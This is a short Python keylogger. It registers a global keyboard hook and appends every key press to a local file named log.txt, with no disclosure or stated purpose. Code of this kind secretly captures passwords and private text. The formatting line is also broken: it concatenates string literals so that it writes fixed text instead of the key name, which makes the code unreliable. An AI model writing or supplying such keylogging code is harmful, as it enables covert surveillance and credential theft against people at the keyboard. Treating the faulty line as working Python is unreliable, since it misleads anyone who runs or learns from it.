import keyboard

log_file = "log.txt"


def on_key_press(event):
   with open("log.txt","a") as f:
       if event.name=='space':
           f.write(' ')
       elif event.name=='enter':
           f.write('\n')
       else:
           f.write('{}' '.format(event.name)')


keyboard.on_press(on_key_press)

keyboard.wait()
